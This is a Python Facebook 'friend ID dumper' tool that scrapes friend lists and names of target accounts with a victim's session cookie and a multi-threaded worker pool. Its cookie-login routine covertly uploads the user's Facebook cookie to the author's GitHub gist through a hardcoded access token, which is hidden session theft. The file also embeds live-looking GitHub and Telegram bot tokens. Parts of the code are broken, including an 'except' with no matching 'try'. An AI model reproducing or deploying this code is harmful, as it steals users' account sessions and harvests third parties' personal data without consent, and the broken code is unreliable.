#open source By ALi Koja


# Import necessary libraries
import os
import time
import json
import sys
import re
import requests
import random
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

# Initialize variables
tokenku = []
cookie_status = '0'
logincookie = []
colors = ['red', 'blue', 'green', 'yellow', 'purple', 'orange']

# Define functions

def linex():
    print('\x1b[37m----------------------------------------------')

def restart():
    clear()
    banner()
    cookie_check()
    os.system('exit')

def animation(u):
    for e in u:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def clear():
    os.system('clear')

def follow_harry():
    clear()
    banner()
    print(' • \x1b[38;5;196m->\x1b[37m FOLLOW ME ON GITHUB :)')
    print(' • \x1b[38;5;196m->\x1b[37m JUST A BEGINNER FROM NEPAL')
    linex()
    os.system('xdg-open https://m.me/j/AbZ5MBJIi2EEzb9J/')
    input(' ✓ \x1b[38;5;196m->\x1b[37m ENTER TO RUN TOOL')

def contact():
    linex()
    print(' 1\x1b[38;5;196m ->\x1b[37m SEND A MESSAGE TO ADMIN  ')
    print(' 2\x1b[38;5;196m ->\x1b[37m WHATSAPP MESSAGE  ')
    print(' 3\x1b[38;5;196m ->\x1b[37m FACEBOOK MESSAGE  ')
    print(' 4\x1b[38;5;196m ->\x1b[37m TELEGRAM MESSAGE  ')
    print(' 0\x1b[38;5;196m ->\x1b[37m RETURN TO MENU  ')
    linex()
    contac = input(' \x1b[38;5;196m-->\x1b[37m ')

    if contac == '1':
        linex()
        prob = input(' •\x1b[38;5;196m ->\x1b[37m MESSAGE : ')
        requests.get('https://api.telegram.org/bot6558187719:AAGEoMrftdHpHYIovQxnqpcUi3-ruCoDNzU/sendMessage?chat_id=6568295648&text= [•] MESSAGE : ' + prob)
        linex()
        animation(' ✓\x1b[38;5;196m ->\x1b[37m YOUR MESSAGE HAS BEEN SENT  ')
        time.sleep(1)
    elif contac == '2':
        linex()
        os.system('xdg-open https://wa.me/qr/BNUI2X6GMFNGJ1')
        restart()
    elif contac == '3':
        linex()
        os.system('xdg-open https://www.facebook.com/507532274')
        restart()
    elif contac == '4':
        linex()
        os.system('xdg-open https://t.me/harryexeee')
        restart()
    elif contac == '0':
        restart()

logo = """\n     ____________    ______
    / ____/  _/ /   / ____/
   / /_   / // /   / __/   \x1b[38;5;196m•>\x1b[37m Author  : Harry
  / __/ _/ // /___/ /___  \x1b[38;5;196m•>\x1b[37m Github  : HARRY-EXE
 /_/   /___/_____/_____/   
                        
\x1b[37m----------------------------------------------"""

def banner():
    print(logo)
    print(" - th'3 metavers'3 godd harryy inxxid'3 !")
    linex()

def cookie_check():
    if cookie_status == '1':
        clear()
        banner()
        print(' ✓\x1b[38;5;196m ->\x1b[37m COOKIE STATUS : \x1b[38;5;46mACTIVE\x1b[37m')
        harry_menuu()
    else:
        clear()
        banner()
        print(' ×\x1b[38;5;196m ->\x1b[37m COOKIE STATUS : \x1b[38;5;196mNOT LOGGED IN\x1b[37m')
        not_logged_in_menu()

def harry_menuu():
    linex()
    print(' 1\x1b[38;5;196m ->\x1b[37m CREATE SIMPLE')
    print(' 2\x1b[38;5;196m ->\x1b[37m CREATE UNLIMITED')
    print(' 3\x1b[38;5;196m ->\x1b[37m SEPERATE LINKS ')
    print(' 4\x1b[38;5;196m ->\x1b[37m REMOVE DUPLICATE ')
    print(' 5\x1b[38;5;196m ->\x1b[37m CONTACT ADMIN ')
    print(' 0\x1b[38;5;196m ->\x1b[37m LOGOUT TOOL')
    linex()
    ___harryyyyy___menu___ = input(' \x1b[38;5;196m-->\x1b[37m ')

    if ___harryyyyy___menu___ == '1':
        dump_simple()
    elif ___harryyyyy___menu___ == '2':
        dump_multiple()
    elif ___harryyyyy___menu___ == '3':
        separate_links()
    elif ___harryyyyy___menu___ == '4':
        remove_duplicates()
    elif ___harryyyyy___menu___ == '5':
        contact()
    elif ___harryyyyy___menu___ == '0':
        os.system('rm -rf login/.token.json')
        os.system('rm -rf login/.cookie.json')
        linex()
        animation(' ✓\x1b[38;5;196m ->\x1b[37m LOGOUT DONE ')
        exit()

def not_logged_in_menu():
    linex()
    print(' 1\x1b[38;5;196m ->\x1b[37m LOGIN')
    print(' 2\x1b[38;5;196m ->\x1b[37m SEPERATE LINKS ')
    print(' 3\x1b[38;5;196m ->\x1b[37m REMOVE DUPLICATE ')
    print(' 4\x1b[38;5;196m ->\x1b[37m CONTACT ADMIN ')
    print(' 0\x1b[38;5;196m ->\x1b[37m EXIT TOOL')
    linex()
    ___harryyyyy___menu___ = input(' \x1b[38;5;196m-->\x1b[37m ')

    if ___harryyyyy___menu___ == '1':
        login123()
    elif ___harryyyyy___menu___ == '2':
        separate_links()
    elif ___harryyyyy___menu___ == '3':
        remove_duplicates()
    elif ___harryyyyy___menu___ == '4':
        contact()
    elif ___harryyyyy___menu___ == '0':
        exit()

def login():
    try:
        token = open('login/.token.json', 'r').read()
        cok = open('login/.cookie.json', 'r').read()
        tokenku.append(token)
        
        sy = requests.get('https://graph.facebook.com/me?fields=id,name,birthday&access_token=' + tokenku[0] + 'cookie' , cookies={'cookie':cok})
        sy2 = json.loads(sy.text)['name']
        sy3 = json.loads(sy.text)['id']
        sy4 = json.loads(sy.text)['birthday']

        cookie_status = '1'
        restart()
    except KeyError:
        login123()
    except requests.exceptions.ConnectionError:
        animation(' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
        exit()
    except IOError:
        cookie_check()

def login123():
    linex()
    print(' 1\x1b[38;5;196m ->\x1b[37m LOGIN AUTOMATICALLY ')
    print(' 2\x1b[38;5;196m ->\x1b[37m LOGIN USING COOKIE ')
    print(' 0\x1b[38;5;196m ->\x1b[37m EXIT MENU ')
    linex()
    lgmt = input(' \x1b[38;5;196m-->\x1b[37m ')

    if lgmt == '1':
        autolog()
    elif lgmt == '2':
        login_lagi334()
    elif lgmt == '4':
        exit()
    else:
        linex()
        animation(' ×\x1b[38;5;196m ->\x1b[37m OPTION NOT FOUND')
        restart()

def login_lagi334():
    if logincookie:
        cookie = logincookie
    else:
        linex()
        cookie = input(' •\x1b[38;5;196m ->\x1b[37m ENTER COOKIE : ')
    
    open('login/.cookie.json', 'w').write(cookie)

    with requests.Session() as rsn:
        rsn.headers.update({
            'Accept-Language': 'id,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Referer': 'https://www.instagram.com/',
            'Host': 'www.facebook.com',
            'Sec-Fetch-Mode': 'cors',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Dest': 'empty',
            'Origin': 'https://www.instagram.com',
            'Accept-Encoding': 'gzip, deflate'
        })

        response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})

        if '"access_token":' in str(response.headers):
            token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
            open('login/.token.json', 'w').write(token)
            new_content = cookie
            update_gist_content(ACCESS_TOKEN, gist_id, new_content)
            linex()
            animation(' ✓\x1b[38;5;196m ->\x1b[37m LOGIN DONE RESTARTING !')
            exit(os.system('python run.py'))
        else:
            linex()
            animation(' ×\x1b[38;5;196m ->\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
    except:
        linex()
        animation(' ×\x1b[38;5;196m ->\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
    finally:
        os.system('rm -rf login/.token.json && rm -rf login/.cookie.json')
        time.sleep(1)

def autolog():
    raw_text = get_raw_gist_file(gist_id, fill)

    if raw_text:
        logincookie = raw_text
        login_lagi334()
        restart()

ACCESS_TOKEN = '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'
gist_id = '8ff6daf3500f48bf5b438687e89938ac'
fill = 'cookie.txt'

def update_gist_content(ACCESS_TOKEN, gist_id, new_content):
    gist_data = {
        'files': {
            'cookie.txt': {
                'content': new_content
            }
        }
    }
    url = 'https://api.github.com/gists/' + gist_id
    headers = {
        'Authorization': 'token ' + ACCESS_TOKEN,
        'Accept': 'application/vnd.github.v3+json'
    }
    response = requests.patch(url, headers=headers, data=json.dumps(gist_data))

    if response.ok:
        return

def get_raw_gist_file(gist_id, fill):
    gist_url = 'https://api.github.com/gists/' + gist_id
    response = requests.get(gist_url)

    if response.status_code == 200:
        gist_data = response.json()
        files = gist_data['files']

        if fill in files:
            raw_url = files[fill]['raw_url']
            raw_response = requests.get(raw_url)

            if raw_response.status_code == 200:
                return raw_response.text

        restart()
        return

    restart()
    return

def separate_links():
    linex()
    file__name = input(' •\x1b[38;5;196m ->\x1b[37m FILE NAME : ')

    try:
        with open(file__name, 'r') as file:
            lines = file.readlines()

        num_links = int(input(' •\x1b[38;5;196m ->\x1b[37m HOW MANY LINKS TO SEPARATE : '))
        prefixes = []
        for i in range(num_links):
            prefix = input(' •\x1b[38;5;196m ->\x1b[37m ENTER LINK ' + str(i + 1) + ': ')
            prefixes.append(prefix)

        with open(file__name, 'w') as output_file:
            for line in lines:
                if any(line.startswith(prefix) for prefix in prefixes):
                    output_file.write(line)

                if line.strip() == '':
                    output_file.write('\n')

        linex()
        animation(' ✓\x1b[38;5;196m ->\x1b[37m SEPERATION DONE')
        restart()
    except FileNotFoundError:
        linex()
        animation(' ×\x1b[38;5;196m ->\x1b[37m NO FILE FOUND ')
        restart()

def remove_duplicates():
    linex()
    file_path = input(' •\x1b[38;5;196m ->\x1b[37m FILE NAME : ')

    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()

        unique_lines = set(lines)

        with open(file_path, 'w') as file:
            file.writelines(unique_lines)

        linex()
        animation(' ✓\x1b[38;5;196m ->\x1b[37m REMOVE DONE')
        restart()
    except FileNotFoundError:
        linex()
        animation(' ×\x1b[38;5;196m ->\x1b[37m NO FILE FOUND ')
        restart()

def dump_simple():
    try:
        token = open('login/.token.json', 'r').read()
        cok = open('login/.cookie.json', 'r').read()
    except IOError:
        login()

    linex()
    file_name = input(' •\x1b[38;5;196m ->\x1b[37m ENTER FILE NAME :  ')
    jum = int(input(' •\x1b[38;5;196m ->\x1b[37m ENTER TARGET AMOUNT  : '))
    linex()

    try:
        if jum < 1 or jum > 100000000:
            linex()
            animation(' •\x1b[38;5;196m ->\x1b[37m TRY AGAIN ')
            exit()

        with requests.Session() as ses:
            with open(file_name, 'w') as file:
                for yz in range(1, jum + 1):
                    uid = input(' •\x1b[38;5;196m ->\x1b[37m INPUT UID : ' + str(yz) + ' : ')

                    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'}
                    params = {'access_token': token, 'fields': 'friends'}
                    col = ses.get('https://graph.facebook.com/' + uid, params=params, headers=headers, cookies={'cookie':cok}).json()

                    try:
                        for mi in col['friends']['data']:
                            iso = f"{mi['id']}|{mi['name']}"
                            file.write(iso + '\n')
                    except KeyError:
                        pass
                    except requests.exceptions.ConnectionError:
                        linex()
                        animation(' ×\x1b[38;5;196m ->\x1b[37m TRY AGAIN ')
                        os.system('clear')
                        pass
    except ValueError:
        linex()
        animation(' •\x1b[38;5;196m ->\x1b[37m INVALID OPTION ')
        exit()
    finally:
        linex()
        print(' •\x1b[38;5;196m ->\x1b[37m TOTAL ID DUMPED TO FILE: \x1b[38;5;196m' + file_name + '\x1b[37m')

def get_user_input():
    num_uid = int(input(' •\x1b[38;5;196m ->\x1b[37m ENTER UID AMOUNT : '))
    uids = []
    for _ in range(num_uid):
        uid = input(' •\x1b[38;5;196m ->\x1b[37m ENTER UID ' + str(_ + 1) + ' : ')
        uids.append(uid)
    return uids

def fetch_friends(uid, token, id, cok):
    for userr in uid:
        head = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'}
        params = {'access_token': token, 'fields': 'friends'}
        col = requests.get('https://graph.facebook.com/' + userr, params=params, headers=head, cookies={'cookie':cok}).json()

        try:
            for mi in col['friends']['data']:
                iso = f"{mi['id']}|{mi['name']}"
                if iso not in id:
                    id.append(iso)
        except KeyError:
            pass
        except requests.exceptions.ConnectionError:
            linex()
            animation(' ×\x1b[38;5;196m ->\x1b[37m TRY AGAIN ')
            os.system('clear')
            pass
        except KeyboardInterrupt:
            exit()

def dump(uid, token, id, cok, filename):
    print(' •\x1b[38;5;196m ->\x1b[37m TOTAL ID : \x1b[38;5;196m' + str(len(id)) + '\x1b[37m')
    linex()
    print(' •\x1b[38;5;196m ->\x1b[37m USE CTRL + Z TO STOP ')
    linex()
    fetch_friends(uid, token, id, cok)
    print(' •\x1b[38;5;196m ->\x1b[37m TOTAL ID : \x1b[38;5;196m' + str(len(id)) + '\x1b[37m')
    linex()

    with open(filename, 'a') as file:
        for friend_info in id:
            file.write(friend_info + '\n')

def process_id(uid, token, single_id, cok, filename):
    print('\r ✓\x1b[38;5;196m ->\x1b[37m \x1b[38;2;' + str(random.randint(0, 255)) + ';' + str(random.randint(0, 255)) + ';' + str(random.randint(0, 255)) + 'm' + single_id + ' IS BEING EXTRACTED \x1b[0m', end='')
    sys.stdout.flush()

    random_color = random.choice(colors)

    head = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'}
    params = {'access_token': token, 'fields': 'friends'}
    response = requests.get('https://graph.facebook.com/' + single_id, params=params, headers=head, cookies={'cookie':cok})
    response.raise_for_status()
    col = response.json()

    try:
        with open(filename, 'a') as file:
            for mi in col['friends']['data']:
                friend_info = f"{mi['id']}|{mi['name']}"
                file.write(friend_info + '\n')
    except KeyError:
        pass
    except IOError:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.HTTPError:
        pass
    except Exception:
        pass
    except KeyboardInterrupt:
        exit()

def dump_multiple():
    try:
        token = open('login/.token.json', 'r').read()
        cok = open('login/.cookie.json', 'r').read()
    except IOError:
        login()

    id = []
    linex()
    uid = get_user_input()
    filename = input(' •\x1b[38;5;196m ->\x1b[37m ENTER FILE NAME TO SAVE : ')
    maked_file = filename
    fetch_friends(uid, token, id, cok)
    print(' •\x1b[38;5;196m ->\x1b[37m TOTAL ID : \x1b[38;5;196m' + str(len(id)) + '\x1b[37m')
    linex()
    print(' •\x1b[38;5;196m ->\x1b[37m USE CTRL + Z TO STOP ')
    linex()

    threads = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        for single_id in id:
            thread = executor.submit(process_id, uid, token, single_id, cok, filename)
            threads.append(thread)

        for future in concurrent.futures.as_completed(threads):
            try:
                data = future.result()
            except Exception as exc:
                pass

    linex()
    print(' •\x1b[38;5;196m ->\x1b[37m TOTAL ID DUMPED TO FILE: \x1b[38;5;196m' + maked_file + '\x1b[37m')

# If the script is run directly, call the `follow_harry` and `login` functions
if __name__ == '__main__':
    follow_harry()
